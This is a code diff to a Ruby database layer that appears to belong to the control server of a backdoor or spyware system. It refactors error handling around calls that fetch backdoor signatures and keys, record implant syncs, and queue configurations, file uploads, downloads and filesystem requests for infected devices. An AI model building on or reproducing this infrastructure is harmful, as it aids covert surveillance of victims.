@@ -75,9 +75,9 @@ class DB
   end
 
   def connected=(value)
-    #TODO: set this variable accordingly in each method to detect when the db is down
-    #@available = value
-    if value == true then
+    # set this variable accordingly in each method to detect when the db is down
+    @available = value
+    if @available then
       trace :info, "DB is up and running"
     else
       trace :warn, "DB is now considered NOT available"
@@ -90,8 +90,15 @@ class DB
     return @available
   end
 
-  def cache_init
+  def db_call(method, *args)
+    begin
+      return @db.send method, *args
+    rescue
+      self.connected = false
+    end
+  end
 
+  def cache_init
     # if the db is available, clear the cache and populate it again
     if @available then
       trace :info, "Emptying the DB cache..."
@@ -100,11 +107,11 @@ class DB
 
       trace :info, "Populating the DB cache..."
       # get the global signature (per customer) for all the backdoors
-      sig = @db.backdoor_signature
+      sig = db_call :backdoor_signature
       @backdoor_signature = Digest::MD5.digest sig unless sig.nil? 
       
       # get the classkey of every backdoor and store it in the cache
-      @class_keys = @db.class_keys
+      @class_keys = db_call :class_keys
 
       # save in the permanent cache
       Cache.signature = sig
@@ -134,9 +141,10 @@ class DB
   end
 
   def update_status(component, ip, status, message, stats)
-    trace :debug, "update status: #{status} #{message} #{stats}"
+    return unless @available
 
-    @db.update_status component, ip, status, message, stats[:disk], stats[:cpu], stats[:pcpu]
+    trace :debug, "update status: #{status} #{message} #{stats}"
+    db_call :update_status, component, ip, status, message, stats[:disk], stats[:cpu], stats[:pcpu]
   end
 
   def class_key_of(build_id)
@@ -144,9 +152,11 @@ class DB
     return Digest::MD5.digest @class_keys[build_id] unless @class_keys[build_id].nil?
 
     trace :debug, "Cache Miss: class key for #{build_id}"
+
+    return nil unless @available
     
     # ask to the db the class key
-    key = @db.class_keys build_id
+    key = db_call :class_keys, build_id
 
     # save the class key in the cache (memory and permanent)
     if not key.nil? then
@@ -168,7 +178,7 @@ class DB
   # returns ALWAYS the status of a backdoor
   def status_of(build_id, instance_id, subtype)
     # if the database has gone, reply with a fake response in order for the sync to continue
-    return DB::UNKNOWN_BACKDOOR, 0 if not @available
+    return DB::UNKNOWN_BACKDOOR, 0 unless @available
 
     trace :debug, "Asking the status of [#{build_id}] to the db"
 
@@ -176,21 +186,17 @@ class DB
     bid = 0
     
     # ask the database the status of the backdoor
-    begin
-      status, bid = @db.status_of(build_id, instance_id, subtype)
-    rescue Timeout::Error
-      self.connected = false
-    end
+    status, bid = db_call :status_of, build_id, instance_id, subtype
 
     return status, bid
   end
 
   def sync_for(bid, version, user, device, source, time)
     # database is down, continue
-    return if not @available
+    return unless @available
 
     # tell the db that the backdoor has synchronized
-    @db.sync_for bid, version, user, device, source, time
+    db_call :sync_for, bid, version, user, device, source, time
   end
 
   def new_conf?(bid)
@@ -201,7 +207,7 @@ class DB
     return false unless @available
 
     # retrieve the config from the db
-    cid, config = @db.new_conf bid
+    cid, config = db_call :new_conf, bid
 
     # put the config in the cache
     Cache.save_conf bid, cid, config unless config.nil?
@@ -216,7 +222,7 @@ class DB
     return nil if config.nil?
 
     # set the status to "sent" in the db
-    @db.conf_sent cid
+    db_call :conf_sent, cid if @available
 
     # delete the conf from the cache
     Cache.del_conf bid
@@ -232,7 +238,7 @@ class DB
     return false unless @available
 
     # retrieve the downloads from the db
-    uploads = @db.new_uploads bid
+    uploads = db_call :new_uploads, bid
 
     # put the config in the cache
     Cache.save_uploads bid, uploads unless uploads.empty?
@@ -247,7 +253,8 @@ class DB
     return nil if upload.nil?
 
     # delete from the db
-    @db.del_upload upload[:id]
+    db_call :del_upload, upload[:id] if @available
+
     # delete the conf from the cache
     Cache.del_upload upload[:id]
 
@@ -262,7 +269,7 @@ class DB
     return false unless @available
 
     # retrieve the downloads from the db
-    downloads = @db.new_downloads bid
+    downloads = db_call :new_downloads, bid
 
     # put the config in the cache
     Cache.save_downloads bid, downloads unless downloads.empty?
@@ -280,7 +287,7 @@ class DB
     # remove the downloads from the db
     downloads.each_pair do |key, value|
       # delete the entry from the db
-      @db.del_download key
+      db_call :del_download, key if @available
       # return only the filename
       down << value
     end
@@ -299,7 +306,7 @@ class DB
     return false unless @available
 
     # retrieve the downloads from the db
-    filesystems = @db.new_filesystems bid
+    filesystems = db_call :new_filesystems, bid
 
     # put the config in the cache
     Cache.save_filesystems bid, filesystems unless filesystems.empty?
@@ -317,7 +324,7 @@ class DB
     # remove the filesystems from the db
     filesystems.each_pair do |key, value|
       # delete the entry from the db
-      @db.del_filesystem key
+      db_call :del_filesystem, key if @available
       # return only the {:depth => , :path => } hash
       files << value
     end
